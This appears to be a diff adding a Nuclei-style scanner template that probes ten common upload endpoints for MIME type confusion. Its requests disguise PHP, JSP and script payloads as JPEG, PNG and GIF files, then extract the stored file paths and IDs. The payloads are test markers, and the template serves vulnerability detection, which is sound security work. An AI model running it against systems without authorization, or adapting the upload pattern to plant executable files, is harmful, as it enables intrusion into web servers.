@@ -1,0 +1,114 @@
+id: medium-webapp-mime-type-confusion-upload
+
+info:
+  name: MIME Type Confusion in File Upload
+  author: elite-red-team
+  severity: high
+  description: |
+    Detects MIME type confusion vulnerabilities in file upload functionality where applications
+    rely solely on Content-Type header validation instead of proper file content validation.
+    This can lead to malicious file uploads bypassing security controls.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+    - https://portswigger.net/web-security/file-upload
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.1
+    cwe-id: CWE-434
+  tags: file-upload,mime-confusion,bypass,medium
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="test.jpg"
+        Content-Type: image/jpeg
+        
+        <?php echo "MIME_CONFUSION_TEST"; phpinfo(); ?>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="test.png"
+        Content-Type: image/png
+        
+        <%@ page language="java" %>
+        <% out.println("MIME_CONFUSION_JSP_TEST"); %>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="test.gif"
+        Content-Type: image/gif
+        
+        <script>alert('MIME_CONFUSION_XSS_TEST')</script>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    payloads:
+      path:
+        - "/upload"
+        - "/fileupload"
+        - "/file/upload"
+        - "/api/upload"
+        - "/admin/upload"
+        - "/user/upload"
+        - "/media/upload"
+        - "/assets/upload"
+        - "/files/upload"
+        - "/documents/upload"
+
+    attack: pitchfork
+    threads: 10
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        words:
+          - "upload"
+          - "success"
+          - "file"
+          - "saved"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        words:
+          - "error"
+          - "failed"
+          - "invalid"
+          - "rejected"
+        condition: or
+        negative: true
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: upload_path
+        regex:
+          - '(?i)(uploads?/[^"\'<>\s]+)'
+          - '(?i)(files?/[^"\'<>\s]+)'
+          - '(?i)(media/[^"\'<>\s]+)'
+
+      - type: regex
+        name: file_id
+        regex:
+          - '(?i)file[_-]?id["\']?\s*[:=]\s*["\']?([^"\'<>\s]+)'
+          - '(?i)upload[_-]?id["\']?\s*[:=]\s*["\']?([^"\'<>\s]+)'
